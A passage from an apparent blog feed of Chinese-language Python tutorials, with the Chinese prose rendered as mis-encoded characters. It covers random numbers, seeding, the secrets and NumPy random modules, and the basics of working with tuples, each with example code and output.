class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># é€‰æ‹©å¯é‡å¤çš„kä¸ªå…ƒç´ ï¼Œå¹¶è¿”å›å¤§å°ä¸ºkçš„åˆ—è¡¨</span></span><br><span class="line">a = random.choices(<span class="built_in">list</span>(<span class="string">&quot;ABCDEFGHI&quot;</span>),k=<span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># åŸåœ°éšæœºæ’åˆ—</span></span><br><span class="line">a = <span class="built_in">list</span>(<span class="string">&quot;ABCDEFGHI&quot;</span>)</span><br><span class="line">random.shuffle(a)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">0.10426373452067317</span></span><br><span class="line"><span class="number">3.34983979352444</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line">-<span class="number">1.004568769635799</span></span><br><span class="line">E</span><br><span class="line">[<span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;B&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;A&#x27;</span>]</span><br></pre></td></tr></table></figure><h3><span id="chong-zi-sheng-cheng-qi">ç§å­ç”Ÿæˆå™¨</span></h3><p>ä½¿ç”¨ <code>random.seed()</code>ï¼Œå¯ä»¥ä½¿ç»“æœå¯é‡å¤ï¼Œå¹¶ä¸” <code>random.seed()</code> ä¹‹åçš„è°ƒç”¨é“¾å°†äº§ç”Ÿç›¸åŒçš„æ•°æ®è½¨è¿¹ã€‚ éšæœºæ•°åºåˆ—å˜å¾—ç¡®å®šï¼Œæˆ–å®Œå…¨ç”±ç§å­å€¼ç¡®å®šã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Seeding with 1...\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">random.seed(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(random.random())</span><br><span class="line"><span class="built_in">print</span>(random.uniform(<span class="number">1</span>,<span class="number">10</span>))</span><br><span class="line"><span class="built_in">print</span>(random.choice(<span class="built_in">list</span>(<span class="string">&quot;ABCDEFGHI&quot;</span>)))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\nRe-seeding with 42...\n&#x27;</span>)</span><br><span class="line">random.seed(<span class="number">42</span>)  <span class="comment"># é‡è®¾éšæœºç§å­</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(random.random())</span><br><span class="line"><span class="built_in">print</span>(random.uniform(<span class="number">1</span>,<span class="number">10</span>))</span><br><span class="line"><span class="built_in">print</span>(random.choice(<span class="built_in">list</span>(<span class="string">&quot;ABCDEFGHI&quot;</span>)))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\nRe-seeding with 1...\n&#x27;</span>)</span><br><span class="line">random.seed(<span class="number">1</span>)  <span class="comment"># é‡è®¾éšæœºç§å­</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(random.random())</span><br><span class="line"><span class="built_in">print</span>(random.uniform(<span class="number">1</span>,<span class="number">10</span>))</span><br><span class="line"><span class="built_in">print</span>(random.choice(<span class="built_in">list</span>(<span class="string">&quot;ABCDEFGHI&quot;</span>)))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\nRe-seeding with 42...\n&#x27;</span>)</span><br><span class="line">random.seed(<span class="number">42</span>)  <span class="comment"># é‡è®¾éšæœºç§å­</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(random.random())</span><br><span class="line"><span class="built_in">print</span>(random.uniform(<span class="number">1</span>,<span class="number">10</span>))</span><br><span class="line"><span class="built_in">print</span>(random.choice(<span class="built_in">list</span>(<span class="string">&quot;ABCDEFGHI&quot;</span>)))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Seeding <span class="keyword">with</span> <span class="number">1.</span>..</span><br><span class="line"></span><br><span class="line"><span class="number">0.13436424411240122</span></span><br><span class="line"><span class="number">8.626903632435095</span></span><br><span class="line">B</span><br><span class="line"></span><br><span class="line">Re-seeding <span class="keyword">with</span> <span class="number">42.</span>..</span><br><span class="line"></span><br><span class="line"><span class="number">0.6394267984578837</span></span><br><span class="line"><span class="number">1.2250967970040025</span></span><br><span class="line">E</span><br><span class="line"></span><br><span class="line">Re-seeding <span class="keyword">with</span> <span class="number">1.</span>..</span><br><span class="line"></span><br><span class="line"><span class="number">0.13436424411240122</span></span><br><span class="line"><span class="number">8.626903632435095</span></span><br><span class="line">B</span><br><span class="line"></span><br><span class="line">Re-seeding <span class="keyword">with</span> <span class="number">42.</span>..</span><br><span class="line"></span><br><span class="line"><span class="number">0.6394267984578837</span></span><br><span class="line"><span class="number">1.2250967970040025</span></span><br><span class="line">E</span><br></pre></td></tr></table></figure><h3><span id="secrets-mo-kuai"><code>secrets</code> æ¨¡å—</span></h3><p><code>secrets</code> æ¨¡å—ç”¨äºç”Ÿæˆé€‚åˆäºç®¡ç†æ•°æ®ï¼ˆä¾‹å¦‚å¯†ç ï¼Œå¸æˆ·èº«ä»½éªŒè¯ï¼Œå®‰å…¨ä»¤ç‰Œå’Œç›¸å…³æœºå¯†ï¼‰çš„å¯†ç å­¦ä¸Šå¼ºçš„éšæœºæ•°ã€‚</p><p>ç‰¹åˆ«æ˜¯ï¼Œåº”ä¼˜å…ˆä½¿ç”¨<code>secrets</code> è€Œä¸æ˜¯ <code>random</code> æ¨¡å—ä¸­é»˜è®¤çš„ä¼ªéšæœºæ•°ç”Ÿæˆå™¨ï¼Œåè€…æ˜¯ä¸ºå»ºæ¨¡å’Œä»¿çœŸè€Œè®¾è®¡çš„ï¼Œè€Œä¸æ˜¯å®‰å…¨æˆ–åŠ å¯†æŠ€æœ¯ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"></span><br><span class="line"><span class="comment"># [0, n) ä¹‹é—´çš„éšæœºæ•´æ•°ã€‚</span></span><br><span class="line">a = secrets.randbelow(<span class="number">10</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿”å›å…·æœ‰kä¸ªéšæœºä½çš„æ•´æ•°ã€‚</span></span><br><span class="line">a = secrets.randbits(<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä»åºåˆ—ä¸­é€‰æ‹©ä¸€ä¸ªéšæœºå…ƒç´ </span></span><br><span class="line">a = secrets.choice(<span class="built_in">list</span>(<span class="string">&quot;ABCDEFGHI&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">6</span></span><br><span class="line"><span class="number">6</span></span><br><span class="line">E</span><br></pre></td></tr></table></figure><h3><span id="numpy-de-sui-ji-shu">NumPyçš„éšæœºæ•°</span></h3><p>ä¸ºå¤šç»´æ•°ç»„åˆ›å»ºéšæœºæ•°ã€‚NumPyä¼ªéšæœºæ•°ç”Ÿæˆå™¨ä¸Pythonæ ‡å‡†åº“ä¼ªéšæœºæ•°ç”Ÿæˆå™¨ä¸åŒã€‚</p><p>é‡è¦çš„æ˜¯ï¼Œè®¾ç½®Pythonä¼ªéšæœºæ•°ç”Ÿæˆå™¨ç§å­ä¸ä¼šå½±å“NumPyä¼ªéšæœºæ•°ç”Ÿæˆå™¨ï¼Œå¿…é¡»å•ç‹¬è®¾ç½®å’Œä½¿ç”¨ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">np.random.seed(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># rand(d0,d1,â€¦,dn)</span></span><br><span class="line"><span class="comment"># ç”Ÿæˆéšæœºæµ®ç‚¹æ•°çš„å¤šç»´æ•°ç»„, æ•°ç»„å¤§å°ä¸º (d0,d1,â€¦,dn)</span></span><br><span class="line"><span class="built_in">print</span>(np.random.rand(<span class="number">3</span>))</span><br><span class="line"><span class="comment"># é‡è®¾éšæœºç§å­</span></span><br><span class="line">np.random.seed(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(np.random.rand(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç”Ÿæˆ [a,b) ä¹‹é—´éšæœºæ•´æ•°çš„å¤šç»´æ•°ç»„ï¼Œå¤§å°ä¸º n</span></span><br><span class="line">values = np.random.randint(<span class="number">0</span>, <span class="number">10</span>, (<span class="number">5</span>,<span class="number">3</span>))</span><br><span class="line"><span class="built_in">print</span>(values)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨æ­£æ€åˆ†å¸ƒå€¼ç”Ÿæˆå¤šç»´æ•°ç»„ï¼Œæ•°ç»„å¤§å°ä¸º (d0,d1,â€¦,dn)</span></span><br><span class="line"><span class="comment"># æ¥è‡ªæ ‡å‡†æ­£æ€åˆ†å¸ƒçš„å¹³å‡å€¼ä¸º0.0ä¸”æ ‡å‡†åå·®ä¸º1.0çš„å€¼</span></span><br><span class="line">values = np.random.randn(<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(values)</span><br><span class="line"></span><br><span class="line"><span class="comment"># éšæœºæ’åˆ—ä¸€ä¸ªå¤šç»´æ•°ç»„.</span></span><br><span class="line"><span class="comment"># ä»…æ²¿å¤šç»´æ•°ç»„çš„ç¬¬ä¸€è½´éšæœºæ’åˆ—æ•°ç»„</span></span><br><span class="line">arr = np.array([[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>], [<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>], [<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>]])</span><br><span class="line">np.random.shuffle(arr)</span><br><span class="line"><span class="built_in">print</span>(arr)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[<span class="number">4.17022005e-01</span> <span class="number">7.20324493e-01</span> <span class="number">1.14374817e-04</span>]</span><br><span class="line">[<span class="number">4.17022005e-01</span> <span class="number">7.20324493e-01</span> <span class="number">1.14374817e-04</span>]</span><br><span class="line">[[<span class="number">5</span> <span class="number">0</span> <span class="number">0</span>]</span><br><span class="line"> [<span class="number">1</span> <span class="number">7</span> <span class="number">6</span>]</span><br><span class="line"> [<span class="number">9</span> <span class="number">2</span> <span class="number">4</span>]</span><br><span class="line"> [<span class="number">5</span> <span class="number">2</span> <span class="number">4</span>]</span><br><span class="line"> [<span class="number">2</span> <span class="number">4</span> <span class="number">7</span>]]</span><br><span class="line">[-<span class="number">2.29230928</span> -<span class="number">1.41555249</span>  <span class="number">0.8858294</span>   <span class="number">0.63190187</span>  <span class="number">0.04026035</span>]</span><br><span class="line">[[<span class="number">4</span> <span class="number">5</span> <span class="number">6</span>]</span><br><span class="line"> [<span class="number">7</span> <span class="number">8</span> <span class="number">9</span>]</span><br><span class="line"> [<span class="number">1</span> <span class="number">2</span> <span class="number">3</span>]]</span><br></pre></td></tr></table></figure><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      12. éšæœºæ•° â€” Python è¿›é˜¶
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="Python" scheme="https://qiwihui.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>02. Tuple â€” Python è¿›é˜¶</title>
    <link href="https://qiwihui.com/qiwihui-blog-119/"/>
    <id>https://qiwihui.com/qiwihui-blog-119/</id>
    <published>2022-08-13T01:54:25.570Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<p>å…ƒç»„ï¼ˆTupleï¼‰æ˜¯å¯¹è±¡çš„é›†åˆï¼Œå®ƒæœ‰åºä¸”ä¸å¯å˜ã€‚ å…ƒç»„ç±»ä¼¼äºåˆ—è¡¨ï¼Œä¸»è¦åŒºåˆ«åœ¨äºä¸å¯å˜æ€§ã€‚ åœ¨Pythonä¸­ï¼Œå…ƒç»„ç”¨åœ†æ‹¬å·å’Œé€—å·åˆ†éš”çš„å€¼ä¹¦å†™ã€‚</p><span id="more"></span><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_tuple = (<span class="string">&quot;Max&quot;</span>, <span class="number">28</span>, <span class="string">&quot;New York&quot;</span>)</span><br></pre></td></tr></table></figure><h3><span id="shi-yong-yuan-zu-er-bu-shi-yong-lie-biao-de-yuan-yin">ä½¿ç”¨å…ƒç»„è€Œä¸ä½¿ç”¨åˆ—è¡¨çš„åŸå› </span></h3><ul><li>é€šå¸¸ç”¨äºå±äºåŒä¸€ç›®æ ‡çš„å¯¹è±¡ã€‚</li><li>å°†å…ƒç»„ç”¨äºå¼‚æ„ï¼ˆä¸åŒï¼‰æ•°æ®ç±»å‹ï¼Œå°†åˆ—è¡¨ç”¨äºåŒç±»ï¼ˆç›¸ä¼¼ï¼‰æ•°æ®ç±»å‹ã€‚</li><li>ç”±äºå…ƒç»„æ˜¯ä¸å¯å˜çš„ï¼Œå› æ­¤é€šè¿‡å…ƒç»„è¿›è¡Œè¿­ä»£æ¯”ä½¿ç”¨åˆ—è¡¨è¿›è¡Œè¿­ä»£è¦å¿«ä¸€äº›ã€‚</li><li>å…·æœ‰ä¸å¯å˜å…ƒç´ çš„å…ƒç»„å¯ä»¥ç”¨ä½œå­—å…¸çš„é”®ã€‚ ä½¿ç”¨åˆ—è¡¨åšä¸ºé”®æ˜¯ä¸å¯èƒ½çš„ã€‚</li><li>å¦‚æœä½ æœ‰ä¸å˜çš„æ•°æ®ï¼Œåˆ™å°†å…¶å®ç°ä¸ºå…ƒç»„å°†ç¡®ä¿å…¶æœ‰å†™ä¿æŠ¤ã€‚</li></ul><h3><span id="chuang-jian-yuan-zu">åˆ›å»ºå…ƒç»„</span></h3><p>ç”¨åœ†æ‹¬å·å’Œé€—å·åˆ†éš”çš„å€¼åˆ›å»ºå…ƒç»„ï¼Œæˆ–ä½¿ç”¨å†…ç½®çš„ <code>tuple</code> å‡½æ•°ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tuple_1 = (<span class="string">&quot;Max&quot;</span>, <span class="number">28</span>, <span class="string">&quot;New York&quot;</span>)</span><br><span class="line">tuple_2 = <span class="string">&quot;Linda&quot;</span>, <span class="number">25</span>, <span class="string">&quot;Miami&quot;</span> <span class="comment"># æ‹¬å¼§å¯é€‰</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç‰¹æ®Šæƒ…å†µï¼šåªæœ‰ä¸€ä¸ªå…ƒç´ çš„å…ƒç»„éœ€è¦åœ¨åœ¨æœ€åæ·»åŠ é€—å·ï¼Œå¦åˆ™ä¸ä¼šè¢«è¯†åˆ«ä¸ºå…ƒç»„</span></span><br><span class="line">tuple_3 = (<span class="number">25</span>,)</span><br><span class="line"><span class="built_in">print</span>(tuple_1)</span><br><span class="line"><span class="built_in">print</span>(tuple_2)</span><br><span class="line"><span class="built_in">print</span>(tuple_3)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æˆ–è€…ä½¿ç”¨å†…ç½® tuple å‡½æ•°å°†å¯è¿­ä»£å¯¹è±¡ï¼ˆlistï¼Œdictï¼Œstringï¼‰è½¬å˜ä¸ºå…ƒç»„</span></span><br><span class="line">tuple_4 = <span class="built_in">tuple</span>([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>])</span><br><span class="line"><span class="built_in">print</span>(tuple_4)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">(<span class="string">&#x27;Max&#x27;</span>, <span class="number">28</span>, <span class="string">&#x27;New York&#x27;</span>)</span><br><span class="line">(<span class="string">&#x27;Linda&#x27;</span>, <span class="number">25</span>, <span class="string">&#x27;Miami&#x27;</span>)</span><br><span class="line">(<span class="number">25</span>,)</span><br><span class="line">(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br></pre></td></tr></table></figure><h3><span id="fang-wen-yuan-su">è®¿é—®å…ƒç´ </span></h3><p>å¯ä»¥é€šè¿‡å¼•ç”¨ç´¢å¼•å·è®¿é—®å…ƒç»„é¡¹ã€‚ è¯·æ³¨æ„ï¼Œç´¢å¼•ä»0å¼€å§‹ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">item = tuple_1[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(item)</span><br><span class="line"><span class="comment"># ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨è´Ÿç´¢å¼•ï¼Œæ¯”å¦‚ -1 è¡¨ç¤ºæœ€åä¸€ä¸ªå…ƒç´ ï¼Œ-2 è¡¨ç¤ºå€’æ•°ç¬¬äºŒä¸ªå…ƒç´ ï¼Œä»¥æ­¤ç±»æ¨</span></span><br><span class="line">item = tuple_1[-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(item)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Max</span><br><span class="line">New York</span><br></pre></td></tr></table></figure><h3><span id="tian-jia-huo-zhe-xiu-gai-yuan-su">æ·»åŠ æˆ–è€…ä¿®æ”¹å…ƒç´ </span></h3><p>ä¸å¯èƒ½ï¼Œä¼šè§¦å‘ <code>TypeError</code> é”™è¯¯ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tuple_1[<span class="number">2</span>] = <span class="string">&quot;Boston&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">---------------------------------------------------------------------------</span><br><span class="line">    TypeError                                 Traceback (most recent call last)</span><br><span class="line">    &lt;ipython-input-5-c391d8981369&gt; <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    ----&gt; 1 tuple_1[2] = <span class="string">&quot;Boston&quot;</span></span><br><span class="line"></span><br><span class="line">    TypeError: <span class="string">&#x27;tuple&#x27;</span> object does not support item assignment</span><br></pre></td></tr></table></figure><h3><span id="shan-chu-yuan-zu">åˆ é™¤å…ƒç»„</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">del</span> tuple_2</span><br></pre></td></tr></table></figure><h3><span id="die-dai">è¿­ä»£</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ä½¿ç”¨ for å¾ªç¯è¿­ä»£å…ƒç»„</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tuple_1:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Max</span><br><span class="line"><span class="number">28</span></span><br><span class="line">New York</span><br></pre></td></tr></table></figure><h3><span id="jian-cha-yuan-su-shi-fou-cun-zai">æ£€æŸ¥å…ƒç´ æ˜¯å¦å­˜åœ¨</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">&quot;New York&quot;</span> <span class="keyword">in</span> tuple_1:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;yes&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;no&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">yes</span><br></pre></td></tr></table></figure><h3><span id="you-yong-de-fang-fa">æœ‰ç”¨çš„æ–¹æ³•</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_tuple = (<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,)</span><br><span class="line"></span><br><span class="line"><span class="comment"># len() : è·å–å…ƒç»„å…ƒç´ ä¸ªæ•°</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(my_tuple))</span><br><span class="line"></span><br><span class="line"><span class="comment"># count(x) : è¿”å›ä¸ x ç›¸ç­‰çš„å…ƒç´ ä¸ªæ•°</span></span><br><span class="line"><span class="built_in">print</span>(my_tuple.count(<span class="string">&#x27;p&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># index(x) : è¿”å›ä¸ x ç›¸ç­‰çš„ç¬¬ä¸€ä¸ªå…ƒç´ ç´¢å¼•</span></span><br><span class="line"><span class="built_in">print</span>(my_tuple.index(<span class="string">&#x27;l&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># é‡å¤</span></span><br><span class="line">my_tuple = (<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>) * <span class="number">5</span></span><br><span class="line"><span class="built_in">print</span>(my_tuple)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‹¼æ¥</span></span><br><span class="line">my_tuple = (<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>) + (<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(my_tuple)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å°†åˆ—è¡¨è½¬ä¸ºå…ƒç»„ï¼Œä»¥åŠå°†å…ƒç»„è½¬ä¸ºåˆ—è¡¨</span></span><br><span class="line">my_list = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>]</span><br><span class="line">list_to_tuple = <span class="built_in">tuple</span>(my_list)</span><br><span class="line"><span class="built_in">print</span>(list_to_tuple)</span><br><span class="line"></span><br><span class="line">tuple_to_list = <span class="built_in">list</span>(list_to_tuple)</span><br><span class="line"><span class="built_in">print</span>(tuple_to_list)</span><br><span class="line"></span><br><span class="line"><span class="comment"># convert string to tuple</span></span><br><span class="line">string_to_tuple = <span class="built_in">tuple</span>(<span class="string">&#x27;Hello&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(string_to_tuple)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">5</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line">(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>)</span><br><span class="line">(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">[<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>]</span><br><span class="line">(<span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;o&#x27;</span>)</span><br></pre></td></tr></table></figure><h3><span id="qie-pian">åˆ‡ç‰‡</span></h3><p>å’Œå­—ç¬¦ä¸²ä¸€æ ·ï¼Œä½¿ç”¨å†’å·ï¼ˆ<code>:</code>ï¼‰è®¿é—®åˆ—è¡¨çš„å­éƒ¨åˆ†ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># a[start:stop:step], é»˜è®¤æ­¥é•¿ä¸º 1</span></span><br><span class="line">a = (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>)</span><br><span class="line">b = a[<span class="number">1</span>:<span class="number">3</span>] <span class="comment"># æ³¨æ„ï¼Œæœ€åä¸€ä¸ªç´¢å¼•ä¸åŒ…æ‹¬</span></span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line">b = a[<span class="number">2</span>:] <span class="comment"># çŸ¥é“æœ€å</span></span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line">b = a[:<span class="number">3</span>] <span class="comment"># ä»æœ€å‰å¤´å¼€å§‹</span></span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line">b = a[::<span class="number">2</span>] <span class="comment"># ä»å‰å¾€åæ²¡ä¸¤ä¸ªå…ƒç´ </span></span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line">b = a[::-<span class="number">1</span>] <span class="comment"># ç¿»è½¬å…ƒç»„</span></span><br><span class="line"><span class="built_in">print</span>(b)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">(<span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">(<span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>)</span><br><span class="line">(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">(<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>)</span><br><span class="line">(<span class="number">10</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>å…ƒç»„è§£åŒ…</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å˜é‡ä¸ªæ•°å¿…éœ€ä¸å…ƒç»„å…ƒç´ ä¸ªæ•°ç›¸åŒ</span></span><br><span class="line">tuple_1 = (<span class="string">&quot;Max&quot;</span>, <span class="number">28</span>, <span class="string">&quot;New York&quot;</span>)</span><br><span class="line">name, age, city = tuple_1</span><br><span class="line"><span class="built_in">print</span>(name)</span><br><span class="line"><span class="built_in">print</span>(age)</span><br><span class="line"><span class="built_in">print</span>(city)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æç¤º: ä½¿ç”¨ * è§£åŒ…å¤šä¸ªå…ƒç´ åˆ°åˆ—è¡¨</span></span><br><span class="line">my_tuple = (<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>)</span><br><span class="line">item_first, *items_between, item_last = my_tuple</span><br><span class="line"><span class="built_in">print</span>(item_first)</span><br><span class="line"><span class="built_in">print</span>(items_between)</span><br><span class="line"><span class="built_in">print</span>(item_last)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Max</span><br><span class="line"><span class="number">28</span></span><br><span class="line">New York</span><br><span class="line"><span class="number">0</span></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line"><span class="number">5</span></span><br></pre></td></tr></table></figure><h3><span id="qian-tao-yuan-zu">åµŒå¥—å…ƒç»„</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = ((<span class="number">0</span>, <span class="number">1</span>), (<span class="string">&#x27;age&#x27;</span>, <span class="string">&#x27;height&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">print</span>(a[<span class="number">0</span>])</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">((<span class="number">0</span>, <span class="number">1</span>), (<span class="string">&#x27;age&#x27;</span>, <span class="string">&#x27;height&#x27;</span>))</span><br><span class="line">(<span class="number">0</span>, <span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3><span id="bi-jiao-yuan-zu-he-lie-biao">æ¯”è¾ƒå…ƒç»„å’Œåˆ—è¡¨</span></h3><p>å…ƒç»„çš„ä¸å¯å˜æ€§ä½¿Pythonå¯ä»¥è¿›è¡Œå†…éƒ¨ä¼˜åŒ–ã€‚ å› 